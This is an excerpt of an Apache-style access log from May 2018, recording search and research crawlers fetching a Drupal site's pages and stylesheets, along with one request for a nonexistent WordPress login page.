160.20.252.243 - - [01/May/2018:20:06:50 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
54.70.40.11 - - [01/May/2018:20:06:57 -0400] "GET /2005/ HTTP/1.1" 200 5188 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
54.70.40.11 - - [01/May/2018:20:07:01 -0400] "GET / HTTP/1.1" 200 6386 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
36.110.211.109 - - [01/May/2018:20:07:04 -0400] "GET / HTTP/1.1" 200 6624 "http://www.so.com/" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
36.110.211.109 - - [01/May/2018:20:07:05 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2307 "http://www.so.com/" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
36.110.211.109 - - [01/May/2018:20:07:05 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1025 "http://www.so.com/" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
36.110.211.109 - - [01/May/2018:20:07:05 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 746 "http://www.so.com/" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
36.110.211.109 - - [01/May/2018:20:07:05 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1742 "http://www.so.com/" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
36.110.211.41 - - [01/May/2018:20:07:05 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 662 "http://www.so.com/" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
36.110.211.41 - - [01/May/2018:20:07:05 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 756 "http://www.so.com/" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
36.110.211.42 - - [01/May/2018:20:07:05 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 629 "http://www.so.com/" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
